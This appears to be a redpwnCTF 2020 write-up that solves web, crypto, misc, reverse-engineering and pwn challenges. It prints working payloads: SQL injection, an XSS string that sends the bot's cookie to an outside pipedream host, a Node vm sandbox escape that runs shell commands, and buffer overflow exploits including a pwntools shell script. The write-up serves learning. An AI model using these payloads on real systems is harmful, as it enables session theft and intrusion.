Table of contents
- [Web](#web)
  - [inspector-general](#inspector-general)
  - [login](#login)
  - [static-pastebin](#static-pastebin)
  - [panda-facts](#panda-facts)
- [Crypto](#crypto)
  - [base646464](#base646464)
- [Misc](#misc)
  - [ugly-bash](#ugly-bash)
  - [CaaSiNO](#caasino)
- [Rev](#rev)
  - [ropes](#ropes)
- [Pwn](#pwn)
  - [coffer-overflow-0](#coffer-overflow-0)
  - [coffer-overflow-1](#coffer-overflow-1)

# <a name="web"></a> Web
## <a name="inspector-general"></a> inspector-general
Points: 113
#### Description
>My friend made a new webpage, can you <a href="https://redpwn.net">find a flag</a>?
### Solution
As the name of the challenge suggests, we need to inspect the given site for getting the flag. The flag can be found on <a href="https://redpwn.net/ctfs/">/ctfs</a> page.

![image](https://user-images.githubusercontent.com/38787278/85252999-e121b280-b465-11ea-9986-74a9da4cc188.png)

Flag: flag{1nspector_g3n3ral_at_w0rk}

## <a name="login"></a> login
Points: 161
#### Description
>I made a cool login page. I bet you can't get in!
>
>Site: login.2020.redpwnc.tf

### Solution
The web page shows a login form. When we try to login an AJAX call is made to `/api/flag` with the credentials. We are also given the source file of the login page.
From the code we can see that this is prone to SQL injection.

```javascript
    let result;
    try {
        result = db.prepare(`SELECT * FROM users 
            WHERE username = '${username}'
            AND password = '${password}';`).get();
    } catch (error) {
        res.json({ success: false, error: "There was a problem." });
        res.end();
        return;
    }
    
    if (result) {
        res.json({ success: true, flag: process.env.FLAG });
        res.end();
        return;
    }
```

Moving to Burp, I first tried `admin' or 1=1 #`/`admin`. This generated an error, which is good. I replace `#` with `--` and I got the flag. Afterwards I saw that the db used is `sqlite3`.

![image](https://user-images.githubusercontent.com/38787278/85321314-2f1dd100-b4cd-11ea-9d22-7fbae7a11415.png)

Flag: flag{0bl1g4t0ry_5ql1}

## <a name="static-pastebin"></a> static-pastebin
Points: 413
#### Description
>I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it [here](#https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin)

>Site: [static-pastebin.2020.redpwnc.tf](#https://static-pastebin.2020.redpwnc.tf/)

### Solution
There are two sites for this challenge: one from which we will generate an URL and the second one where we will paste the URL so that a bot can access it.

![image](https://user-images.githubusercontent.com/38787278/85327591-e881a400-b4d7-11ea-9a39-16e6cc58aede.png)

Let's take a look at the js file of this page.

```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const button = document.getElementById('button');
    button.addEventListener('click', () => {
        const text = document.getElementById('text');
        window.location = 'paste/#' + btoa(text.value);
    });
})();
```

So when hitting the `Create` button the value inside the textarea will be base64 encoded and we'll be redirected to `paste/#base64string`. Inserting `testing` we are redirected to `https://static-pastebin.2020.redpwnc.tf/paste/#dGVzdGluZw==`. Here we can see that the page displayed our text. Nice. It seems that we'll try to do a XSS attack.

![image](https://user-images.githubusercontent.com/38787278/85328355-46fb5200-b4d9-11ea-9f04-4fc3619e30c5.png)

Let's take a look at the javascript code that handles this.

```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

We can see that the base64 value from URL is decoded(using `atob`) and somewhat sanitized(by `clean`). Looking at the implementation of `clean()` we can see that as long as we keep the value of `brackets` 0 our input will go into the page.

Trying `><img src onerror="alert(1)">` displayed us an alert, so we're on the right track. As long as we don't insert any additional `<` or `>` we can write anything as payload.

I started a flow in [Pipedream](https://pipedream.com) that will intercept any request coming. I entered the link to my pipedream in the second site so check if the bot visits the link.

![image](https://user-images.githubusercontent.com/38787278/85329696-aeb29c80-b4db-11ea-8db6-259714c1b4c2.png)

I also got an event on the pipedream so all we need to do now is to steal the bot's cookie.

Final payload: `><img src onerror="let x=new XMLHttpRequest();x.open('POST','https://enaa0ihj1uout6j.m.pipedream.net', true);x.send(document.cookie)"/>`

This will generate the next link: `https://static-pastebin.2020.redpwnc.tf/paste#PjxpbWcgc3JjIG9uZXJyb3I9ImxldCB4PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbignUE9TVCcsJ2h0dHBzOi8vZW5hYTBpaGoxdW91dDZqLm0ucGlwZWRyZWFtLm5ldCcsIHRydWUpO3guc2VuZChkb2N1bWVudC5jb29raWUpIi8+Cg==`

After pasting the link in the second site we get the flag.

![image](https://user-images.githubusercontent.com/38787278/85329981-339db600-b4dc-11ea-88f7-5411aefea9b3.png)

Trying to get the flag by a GET method will not work because of the characters of the flag. You have to encode first with something like `btoa`.

Flag: flag{54n1t1z4t10n_k1nd4_h4rd}

## <a name="panda-facts"></a> panda-facts
Points: 420
#### Description
>I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down!
>
>Site: panda-facts.2020.redpwnc.tf

### Solution
The webpage exposes a form where you enter an username and afterwards you receive an encrypted token. The decrypted value is a json with the next fields:
```json
{"integrity":"${INTEGRITY}","member":0,"username":"your-username"}
```
We can get the flag if we are a member. Since only control the username, we have to forge the token. Let's take a look at the encryption and decryption function.
```javascript
async function generateToken(username) {
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    // Predictable IV doesn't matter here
    const iv = Buffer.alloc(16, 0);

    const cipher = crypto.createCipheriv(algorithm, key, iv);

    const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`

    let encrypted = '';
    encrypted += cipher.update(token, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
}

async function decodeToken(encrypted) {
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    // Predictable IV doesn't matter here
    const iv = Buffer.alloc(16, 0);
    const decipher = crypto.createDecipheriv(algorithm, key, iv);

    let decrypted = '';

    try {
        decrypted += decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
    } catch (error) {
        return false;
    }

    let res;
    try {
        res = JSON.parse(decrypted);
    } catch (error) {
        console.log(error);
        return false;
    }

    if (res.integrity !== INTEGRITY) {
        return false;
    }

    return res;
}
```
The function that get us the flag:
```javascript
app.get('/api/flag', async (req, res) => {
    if (!req.cookies.token || typeof req.cookies.token !== 'string') {
        res.json({success: false, error: 'Invalid token'});
        res.end();
        return;
    }

    const result = await decodeToken(req.cookies.token);
    if (!result) {
        res.json({success: false, error: 'Invalid token'});
        res.end();
        return;
    }

    if (!result.member) {
        res.json({success: false, error: 'You are not a member'});
        res.end();
        return;
    }

    res.json({success: true, flag: process.env.FLAG});
});
```

The vulnerability is in the generation of the token. The username is inserted inside the string:
```javascript
const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`
```
We can inject a payload that will overwrite the `member` property. This happens because `JSON.parse()` will take the last occurrence of the property in consideration.

Providing the payload `a","member":1,"a":"` will be concatenating into `{"integrity":"12370cc0f387730fb3f273e4d46a94e5","member":0,"username":"a","member":1,"a":""}`. After decryption, when it will be parsed, the `member` will be 1 and we get the flag.

![image](https://user-images.githubusercontent.com/38787278/85615444-e6008500-b664-11ea-868e-c510d8b43e9f.png)

Flag: flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}

# <a name="crypto"></a> Crypto
## <a name="base646464"></a> base646464
Points: 148
#### Description
>Encoding something multiple times makes it exponentially more secure!

### Solution
We get two files. A text file (`cipher.txt`) with a long string that seems to be base64 encoded and a js file that contains the code used for encoding, as you can see below.

```javascript
const btoa = str => Buffer.from(str).toString('base64');

const fs = require("fs");
const flag = fs.readFileSync("flag.txt", "utf8").trim();

let ret = flag;
for(let i = 0; i < 25; i++) ret = btoa(ret);

fs.writeFileSync("cipher.txt", ret);
```

So, it seems that the content of `flag.txt` was base64 encoded 25 times. Let's try to decode that with the next code.

```javascript
const fs = require("fs");
const encodedFlag = fs.readFileSync("cipher.txt", "utf8");
let decodedStr = encodedFlag;

for(let i = 0; i < 25; i++) {
    decodedStr = Buffer.from(decodedStr, 'base64').toString('ascii');
}

console.log(decodedStr);
```

Flag: flag{l00ks_l1ke_a_l0t_of_64s}

# <a name="misc"></a> Misc
## <a name="ugly-bash"></a> ugly-bash
Points: 378
#### Description
>This bash script evaluates to `echo dont just run it, dummy # flag{...}` where the flag is in the comments.
>
>The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes?
>
>Enjoy the intro misc chal.

We get a file with obfuscate bash, ~5000 characters. If we run it prints `dont just run it, dummy`. A part from the start of the code:

```bash
${*%c-dFqjfo}  e$'\u0076'al "$(   ${*%%Q+n\{}   "${@~}" $'\160'r""$'\151'$@nt"f" %s   ' }~~@{$  ")   }La?cc87J
```

I looked over an deobfucating tool, but I didn't find anything, but I read that it can be deobfucated easily by `echo`-ing the script before eecuting. So, that's what I did. Running `echo ${*%c-dFqjfo}  e$'\u0076'al "$(   ${*%%Q+n\{} ...` made things more visible:

```bash
eval  "$@"   "${@//.WS1=|}" $BASH  ${*%%Y#0C}   ${*,,} <<<  "$(     E6YbzJ=(   "${@,}" f   "${@}"
```

Now it's clear that the result of whatever is executed in the right of the `<<<` is passed as input to what's on the left of it.

Echo-ing the left part:

```bash
eval /usr/bin/bash
```
Echo-ing the right side got me an error so I tried to just execute it and I got the flag:
```bash
echo dont just run it, dummy # flag{us3_zsh,_dummy}: command not found
```
Flag: flag{us3_zsh,_dummy}

## <a name="caasino"></a> CaaSiNO
Points: 416
#### Description
>Who needs regex for sanitization when we have VMs?!?!
>
>The flag is at /ctf/flag.txt
>
>nc 2020.redpwnc.tf 31273
### Solution
Beside the connection endpoint we also get the source code:
```javascript
const vm = require('vm')
const readline = require('readline')

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

process.stdout.write('Welcome to my Calculator-as-a-Service (CaaS)!\n')
process.stdout.write('This calculator lets you use the full power of Javascript for\n')
process.stdout.write('your computations! Try `Math.log(Math.expm1(5) + 1)`\n')
process.stdout.write('Type q to exit.\n')
rl.prompt()
rl.addListener('line', (input) => {
  if (input === 'q') {
    process.exit(0)
  } else {
    try {
      const result = vm.runInNewContext(input)
      process.stdout.write(result + '\n')
    } catch {
      process.stdout.write('An error occurred.\n')
    }
    rl.prompt()
  }
})
```
So, we pass javascript commands and those commands are executed in a separate context using the node.js `vm` module. No filtering is applied so our goal is to evade from the context created in `vm.runInNewContext` and get the flag.

Searching, one of the firsts articles that popped-up was [Sandboxing NodeJS is hard, here is why](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html), which had all the information needed for completing the challenge. The payload described there, also the one that I used, is leveraging the use of the `this` keyword. The keyword accesses the instance of the parent object, in this case, it's the context of the object outside of the `vm.runInNewContext`. Now that we can escape from that, we want to get the `process` of the parent object so that we can execute our command. We can do this by accessing the constructor property of the parent object, from which we can run the constructor function that will return the process that we want.

Up until now we have: `this.constructor.constructor('return this.process')()`. Good. Now, using the returned value, we can execute commands. Final payload:

```javascript
this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()
```
![image](https://user-images.githubusercontent.com/38787278/85459786-3ddab580-b5ab-11ea-9168-88fb268a9ca5.png)

Flag: flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}

# <a name="rev"></a> Rev
## <a name="ropes"></a> ropes
Points: 130
#### Description
>It's not just a string, it's a rope!

### Solution
We get a file called `ropes`. We get the flag quickly by running `strings` on it.

![image](https://user-images.githubusercontent.com/38787278/85454723-dff79f00-b5a5-11ea-81e6-80cc74f11d51.png)

Flag: flag{r0pes_ar3_just_l0ng_str1ngs}

# <a name="pwn"></a> Pwn
## <a name="coffer-overflow-0"></a> coffer-overflow-0
Points: 181
#### Description
>Can you fill up the coffers? We even managed to find the source for you.
>
>nc 2020.redpwnc.tf 31199
### Solution
We get an executable and its source file:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code != 0) {
    system("/bin/sh");
  }
}
```

It's clear that we have an buffer overflow on `name` and by overflowing it we will overwrite the `code` variable, and that will get us a shell.
Payload: `AAAABBBBCCCCDDDDEEEEFFFFG`

![image](https://user-images.githubusercontent.com/38787278/85518521-fd118980-b608-11ea-9517-25907161fabe.png)

Flag: flag{b0ffer_0verf10w_3asy_as_123}

# <a name="pwn"></a> Pwn
## <a name="coffer-overflow-1"></a> coffer-overflow-1
Points: 284
#### Description
>The coffers keep getting stronger! You'll need to use the source, Luke.

>nc 2020.redpwnc.tf 31255
### Solution
We get an executable and it's source code:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}
```

We can see that there's a buffer overflow vulnerability on `gets(name)`, but in order to get the a shell we need to overwrite the value from `code` to be `0xcafebabe`.

We can fill the `name` buffer with `AAAABBBBCCCCDDDDEEEEFFFF` and everything we add from here it will get into `code`. Just adding `/xca/xfe/xba/xbe` won't work, we have to provide the bytes as little endian.

We'll get shell using the `pwn` module and sending the payload as it follows:
```python
import pwn

con = pwn.remote('2020.redpwnc.tf', 31255)

con.recv()
con.recv()

exploit = b'AAAABBBBCCCCDDDDEEEEFFFF' + pwn.p32(0xcafebabe)
con.sendline(exploit)

con.sendline('ls')
ls = con.recv()
print(ls)

if b'flag.txt' in ls:
    con.sendline('cat flag.txt')
    print(con.recv().decode('utf-8'))

con.close()
```

`pwn.p32(0xcafebabex)` will make our payload to work for little endian.

![image](https://user-images.githubusercontent.com/38787278/85772996-12300a80-b726-11ea-9244-667d28056f17.png)

Flag: flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
